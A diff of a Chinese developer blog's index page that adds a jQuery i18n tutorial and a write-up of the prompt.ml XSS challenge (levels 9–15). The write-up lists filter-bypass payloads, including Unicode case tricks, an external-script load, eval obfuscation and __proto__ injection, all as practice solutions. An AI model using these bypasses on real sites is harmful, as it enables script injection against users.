@@ -80,6 +80,67 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/11/28/2016/i18n-with-jquery/" title="i18n国际化纯前端渲染" itemprop="url">i18n国际化纯前端渲染</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-11-28T13:39:33.284Z" itemprop="datePublished"> 发表于 11-28-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>项目中有个小要求, 面向的用户主要是英语和西班牙语.<br>也没有搞过, 本来还以为需要写多页面= =</p>
+<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>只能实现固定的文字替换, 动态替换这个功能如果有需求则后续更新~</p>
+<h3 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h3><p>利用<code>html5自定义标签 + ajax + json字典</code>传输回调进行实时无刷新替换语言,<br>所以主要难点就是数据模式设置和json处理了</p>
+<h3 id="目录树"><a href="#目录树" class="headerlink" title="目录树"></a>目录树</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-langs</span><br><span class="line"> |-en_US.json</span><br><span class="line"> |-es_ES.json</span><br><span class="line"> |-zh_CN.json</span><br><span class="line">-js</span><br><span class="line"> |-main.js</span><br></pre></td></tr></table></figure>
+<h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><ol>
+<li><p>HTML with data-* DIY tags</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 语言切换选项 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span> <span class="attr">role</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">data-lang</span>=<span class="string">"chinese"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>[中文]Chinese<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">data-lang</span>=<span class="string">"english"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>[English]English<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">data-lang</span>=<span class="string">"spanish"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>[Español]Spanish<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 显示内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"search"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span> <span class="attr">data-locale</span>=<span class="string">"title"</span>&gt;</span>Watch Search<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span> <span class="attr">data-locale</span>=<span class="string">"label"</span>&gt;</span>Option: <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">data-opt</span>=<span class="string">"username"</span> <span class="attr">selected</span>=<span class="string">"selected"</span> <span class="attr">data-locale</span>=<span class="string">"op-1"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">data-opt</span>=<span class="string">"imei"</span> <span class="attr">data-locale</span>=<span class="string">"op-2"</span>&gt;</span>Watch IMEI<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">data-opt</span>=<span class="string">"phone_number"</span> <span class="attr">data-locale</span>=<span class="string">"op-3"</span>&gt;</span>Phone number<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>JavaScript伪代码(with jQuery)</p>
+</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	变量设置</span></span><br><span class="line"><span class="keyword">var</span> xxx = $(<span class="string">'xxx'</span>),</span><br><span class="line">		<span class="comment">/* codes */</span></span><br><span class="line">		yyy = $(<span class="string">'yyy'</span>);</span><br><span class="line"><span class="comment">//	语言设置的主要代码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">langSet</span>(<span class="params">lang</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> dataSearch = data[<span class="string">'tab-search'</span>];</span><br><span class="line">	$(tabSearch).find(<span class="string">'h2'</span>).html(dataSearch[<span class="string">'title'</span>]);</span><br><span class="line">	$(tabSearch).find(<span class="string">'label'</span>).text(dataSearch[<span class="string">'label'</span>] + <span class="string">': '</span>);</span><br><span class="line">	$(tabSearch).find(<span class="string">'option'</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">index, ele</span>) </span>&#123;</span><br><span class="line">		$(ele).text(dataSearch[<span class="string">'section'</span>][<span class="string">'op-'</span> + index]);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">lanToggle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//	click事件绑定, 用于语言切换</span></span><br><span class="line">	$(<span class="string">'.dropdown-menu'</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">index, element</span>) </span>&#123;</span><br><span class="line">		$(element).find(<span class="string">'a'</span>).bind(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">var</span> lang = $(<span class="keyword">this</span>).attr(<span class="string">'data-lang'</span>);</span><br><span class="line">			langCha(lang);</span><br><span class="line">			<span class="comment">//当前语言文字更换,例如显示当前语言: Language(English)</span></span><br><span class="line">			langSet(lang);	<span class="comment">//渲染</span></span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>3.en_US.json</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tab-search"</span>: &#123;</span><br><span class="line">		<span class="attr">"description"</span>: <span class="string">"json格式和命名, 比如这个是en_US.json, 其他的则是zh_CN.json .etc"</span>,</span><br><span class="line">    <span class="attr">"title"</span>: <span class="string">"Watch Search"</span>,</span><br><span class="line">    <span class="attr">"label"</span>: <span class="string">"Option"</span>,</span><br><span class="line">    <span class="attr">"section"</span>: &#123;</span><br><span class="line">      <span class="attr">"op-0"</span>: <span class="string">"Username"</span>,</span><br><span class="line">      <span class="attr">"op-1"</span>: <span class="string">"Watch IMEI"</span>,</span><br><span class="line">      <span class="attr">"op-2"</span>: <span class="string">"Phone number"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h2><p>本来想直接用jQuery的插件的, 然而用了半天发现这个有点问题, 从segment falut中找了一下方法, 就直接写了, 讲道理构造json和data-* 还是很花时间的.<br>贴个自己的项目地址<a href="https://github.com/a1exlism/kidee" target="_blank" rel="external">https://github.com/a1exlism/kidee</a>, 欢迎fork~</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/11/28/2016/i18n-with-jquery/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/28/2016/i18n-with-jquery/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/11/22/2016/proj-ci/" title="CI &amp; Bootstrap项目开发小结" itemprop="url">CI &amp; Bootstrap项目开发小结</a>
   </h1>
   <p class="article-author">By
@@ -600,7 +661,7 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/08/07/2016/js-json-parse/" title="JSON使用注意" itemprop="url">JSON使用注意</a>
+      <a href="/08/07/2016/xss-4/" title="xss习题集_2.2" itemprop="url">xss习题集_2.2</a>
   </h1>
   <p class="article-author">By
        
@@ -613,30 +674,67 @@
 </header>
     <div class="article-content">
         
-        <h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>最近看xss看到关于json的代码, 就作一个json专项笔记吧.</p>
-<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p>JSON.parse();</p>
-<h3 id="引号问题"><a href="#引号问题" class="headerlink" title="引号问题"></a>引号问题</h3><p>注意一下单引号</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> code = <span class="string">'"\u0070\u0072\u006f\u006d\u0070\u0074\u0028\u0031\u0029"'</span>;</span><br><span class="line"><span class="comment">//  code必须由单引号扩起来</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(code); <span class="comment">// "prompt(1)"</span></span><br><span class="line"><span class="built_in">eval</span>(code); <span class="comment">// prompt(1)</span></span><br></pre></td></tr></table></figure>
-<h3 id="JSON对象"><a href="#JSON对象" class="headerlink" title="JSON对象"></a>JSON对象</h3><p>由上面引出来一个新的问题就是如果传入一个json对象, 那么对象应该是这么写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> postData = &#123;</span><br><span class="line">  <span class="string">"name"</span> : <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
-<p>而不是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> postData = &#123;</span><br><span class="line">  <span class="string">'neme'</span> : <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
-<h2 id="json对象和对象字面量"><a href="#json对象和对象字面量" class="headerlink" title="json对象和对象字面量~"></a>json对象和对象字面量~</h2><blockquote>
-<p>Update in 08/11/2016</p>
+        <h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>还是这个站<a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a>, 不过是下集, 没想到自己不会这么多, 才会出的下集2333</p>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-9-unicode绕过"><a href="#Level-9-unicode绕过" class="headerlink" title="Level-9 unicode绕过"></a>Level-9 unicode绕过</h3><blockquote>
+<p>input.replace(/&lt;([a-zA-Z])/g, ‘<_$1'); input="input.toUpperCase();" return="" '<h1="">‘ + input + ‘‘;</_$1');></p>
+</blockquote>
+<p>主要是过滤了所有感觉能用的字符, 答案还是比较厉害..<br>js函数大写也有被过滤, 不过可以编码和外部加载解决.注意, 在linux/unix下文件名区分大小写, 可以申请全大写或者一些奇怪的字符来进行绕过<br>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg&gt;<span class="xml"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">href</span>=<span class="string">//ᄒ.ws/XXXX</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>自己写的变形:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg onload=&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>目前我能找到的几个latin letter, 更多的需要探索 -&gt; <a href="http://graphemica.com/unicode/characters" target="_blank" rel="external">unicode-characters</a></p>
 <blockquote>
-<p>汤姆大叔<br>JSON有非常严格的语法，在string上下文里<code>{ &quot;prop&quot;: &quot;val&quot; }</code>是个合法的JSON，但<code>{ prop: &quot;val&quot; }</code>和<code>{ &#39;prop&#39;: &#39;val&#39; }</code>确实不合法的</p>
+<p>ß  =&gt; SS<br>ı  =&gt; I<br>ſ  =&gt; S</p>
 </blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;'</span>+<span class="string">'ß'</span>.toUpperCase()[<span class="number">0</span>]+<span class="string">'cript'</span>+<span class="string">'&gt;'</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="Level-10"><a href="#Level-10" class="headerlink" title="Level-10"></a>Level-10</h3><blockquote>
+<p>encodeURIComponent(input).replace(/prompt/g, ‘alert’);<br>input.replace(/‘/g, ‘’);</p>
 </blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  JS对象字面量</span></span><br><span class="line"><span class="keyword">var</span> jsObj = &#123;prop:<span class="string">"val"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  json对象</span></span><br><span class="line"><span class="keyword">var</span> jsonObj = &#123;<span class="string">"prop"</span>:<span class="string">"val"</span>&#125;;</span><br></pre></td></tr></table></figure>
-<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><blockquote>
-<p>复杂的数据结构经常需要用到，并且通过各种各样的中括号{}，小括号()，叫括号&lt;&gt;和空格来组成，这个字符串仅仅是按照要求规范好的字符。</p>
+<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">promp<span class="string">'t(1)</span></span><br></pre></td></tr></table></figure></p>
+<p>这个好迷, 这么后面出了道简单题233</p>
+<blockquote>
+<p><a href="http://stackoverflow.com/questions/75980/when-are-you-supposed-to-use-escape-instead-of-encodeuri-encodeuricomponent" target="_blank" rel="external">stackoverflow-encode*</a><br>Note that encodeURIComponent does not escape the ‘ character</p>
 </blockquote>
-<p>由于在js中所以一般使用的是json, 替代者有<code>YAML</code>和<code>XML</code>（甚至<code>request params</code>）</p>
-<h3 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h3><blockquote>
-<p>Mozilla Developer Center<br>1.他们是固定的值，不是变量，让你从“字面上”理解脚本。 (Literals)<br>2.字符串字面量是由双引号（”）或单引号（’）包围起来的零个或多个字符组成的。(Strings Literals)<br>3.对象字面量是由大括号（{}）括起来的零个或多个对象的属性名-值对。(Object Literals)</p>
+<h3 id="Level-11-DOM内json对象执行限制"><a href="#Level-11-DOM内json对象执行限制" class="headerlink" title="Level-11 DOM内json对象执行限制"></a>Level-11 DOM内json对象执行限制</h3><blockquote>
+<p>input.replace(/[[|\s+*/\&lt;&gt;&amp;^:;=~!%-]/g, ‘’);<br>var dataString = ‘{“action”:”login”,”message”:”Welcome back, ‘ + input + ‘.”}’;<br>document.write(data.message)</p>
 </blockquote>
-<h3 id="什么时候算是JSON"><a href="#什么时候算是JSON" class="headerlink" title="什么时候算是JSON?"></a>什么时候算是JSON?</h3><blockquote>
-<p>形如<code>{ &quot;prop&quot;: &quot;val&quot; }</code>. 可能是JavaScript对象字面量也有可能是JSON字符串;<br>取决于什么上下文使用它;<br>如果是用在string上下文（<code>用单引号或双引号引住，或者从text文件读取</code>）的话，那它就是JSON字符串;<br>如果是用在对象字面量上下文中，那它就是对象字面量;</p>
+<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"(prompt(1))in"</span></span><br></pre></td></tr></table></figure></p>
+<p>学到的:</p>
+<blockquote>
+<ol>
+<li>document.write(alert(1))   //以前一直没碰到过dom类型的, 现在</li>
+<li>根据console错误类型判断能否xss, 这题语法错误, 但是是Error in execution.所以只要能parse出来就行</li>
+</ol>
 </blockquote>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/JSON" target="_blank" rel="external">MDN-json</a><br><a href="http://www.cnblogs.com/TomXu/archive/2012/01/11/2311956.html" target="_blank" rel="external">深入理解js-汤姆大叔</a></p>
+<p>Operator合集: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Expressions_and_Operators" target="_blank" rel="external">MDN-oprators</a></p>
+<p>看到后面我才知道这题正则什么意思, <code>过滤一切符号类型的operator</code>. 然后从character中考虑就是in, instanceof .etc了</p>
+<h3 id="Level-12-script符号过滤"><a href="#Level-12-script符号过滤" class="headerlink" title="Level-12 script符号过滤"></a>Level-12 script符号过滤</h3><blockquote>
+<p>input = encodeURIComponent(input).replace(/‘/g, ‘’);<br>input = input.replace(/prompt/g, ‘alert’);</p>
+</blockquote>
+<p>和第10题类似, 不过屏蔽了<code>/</code>,<code>=</code>,<code>?</code>,<code>\s</code>, <code>,</code>, <code>+</code>等能想到的一些符号, 不过没有过滤<code>.</code>这个属性引用, 所以可以进行如下的构造</p>
+<p>Vector:(虽然做出来了.不过很长)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">	<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">111</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">109</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>))</span><br><span class="line">		.concat(<span class="number">1</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line">)<span class="comment">//需要去掉\s</span></span><br></pre></td></tr></table></figure></p>
+<p>不过答案还用了<code>toString()</code>,比较灵活~<br>vector2:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">	(<span class="number">1558153217</span>).toString(<span class="number">36</span>)  <span class="comment">//数字可以通过 parseInt('prompt', 36) 获得</span></span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>))</span><br><span class="line">		.concat(<span class="number">1</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<p>也是给我了一个提醒, 想起来以前密码学学的一个toString()和parseInt()的进制转化了.<br>嗯, github还有个改进版本<br>vector3:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p>eval这个函数感觉像是没来过一样.完全不影响后续输出</p>
+<p>vector4(变种):<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="number">1558153217.</span>.toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p>关于<code>.</code>的多义性直接戳<a href="https://gist.github.com/a1exlism/00dcfd26d2212e509d2cad28a6745574" target="_blank" rel="external">这个</a></p>
+<h3 id="Level-13-input为json对象-String-repalce-绕过"><a href="#Level-13-input为json对象-String-repalce-绕过" class="headerlink" title="Level-13 input为json对象,String.repalce()绕过"></a>Level-13 input为json对象,String.repalce()绕过</h3><p>代码表示的比较清楚..</p>
+<p>关键点</p>
+<ol>
+<li><a href="/08/13/2016/js-proto/">__proto__</a> 利用</li>
+<li>String.replace() <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#描述" target="_blank" rel="external">内置组<code>$\</code>, $`利用</a></li>
+</ol>
+<p>第二点的话再写个例子好了, 放在了<a href="https://gist.github.com/a1exlism/c6e507a7af27c68e644c520859934fbd" target="_blank" rel="external">gist</a>上.</p>
+<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">"source"</span> : <span class="string">"-"</span>,</span><br><span class="line"> <span class="string">"__proto__"</span> : &#123;<span class="string">"source"</span> : <span class="string">"$`onerror=alert(1)&gt;"</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Level-14-deprecated"><a href="#Level-14-deprecated" class="headerlink" title="Level-14-deprecated"></a>Level-14-deprecated</h3><p>原本思路是绕过img限制直接进行iframe的data协议xss, 但是uppercase已经无法绕过了..</p>
+<h3 id="Level-15-HTML注释bypass-len限制"><a href="#Level-15-HTML注释bypass-len限制" class="headerlink" title="Level-15 HTML注释bypass/len限制"></a>Level-15 HTML注释bypass/len限制</h3><blockquote>
+<p>input = input.replace(/*/g, ‘’);<br>var segments = input.split(‘#’);</p>
+</blockquote>
+<p>和Level-7类似, 不过被过滤了<code>*</code>,还有一个len15限制.<br>思路的话还是comment bypass, 依然是通过<code>svg</code>标签的扩展性导致javascript标签可以使用<code>html注释</code><br>vector:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>prompt(1)<span class="comment">&lt;!--#--&gt;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span>     #可以尝试把svg去掉, 看看会不会弹框</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"></span><br><span class="line">	<span class="comment">&lt;!--</span><br><span class="line">	"aaa'</span><br><span class="line">	alert(1)</span><br><span class="line">	--&gt;</span></span><br><span class="line">	alert(/xss/);</span><br><span class="line"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>嗯, 看了答案有几个不一样的.</p>
+<h4 id="Firefox-amp-MSIE"><a href="#Firefox-amp-MSIE" class="headerlink" title="Firefox&amp;MSIE"></a>Firefox&amp;MSIE</h4><p>自动闭合所需标签, 少了几个字符<br>vector2:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>alert(1)<span class="tag">&lt;/</span></span></span></span><br></pre></td></tr></table></figure></p>
+<p>第三个利用了ES6的模板解析<a href="/08/05/2016/js-template-strings/">这里</a><br>(也考虑到了`这个替代, 模板是没想到..)<br>vector3:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">`#<span class="subst">$&#123;prompt(1)&#125;</span>#`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>…hideen level没找到, 就不管了, 这些感觉够用了~</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
 
         
         
@@ -650,54 +748,7 @@
 <div class="comments-count">
 	
 	  	<span></span>
-		<a href="/08/07/2016/js-json-parse/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/js-json-parse/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/08/07/2016/say-2/" title="无题" itemprop="url">无题</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2016-08-06T16:00:00.000Z" itemprop="datePublished"> 发表于 08-07-2016</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><p><br><br><br>感觉一年下来感觉又是没什么成就, 有点烦.<br><br>有点事去看了一下域名, 发现work后缀的都变贵了233.可能这个域名对我来说算是最值钱的了哈哈<br><br>还有百度似乎并不收录work域名, 这个反而让我感觉很开心, 毕竟买的时候就考虑了这个问题, 嗯, 很好.<br><br>一到家就感觉有点适应不了, 总是贪玩, 怎么可以管不住自己呢. 自己好弱啊. 还有好多书要学啊, 还有一门语言也没碰呢.<br><br>第二件事情就是和协会老司机有点交流了, 谁让我一般不会去看qq的呢(其实就是不想用wine).<br></p>
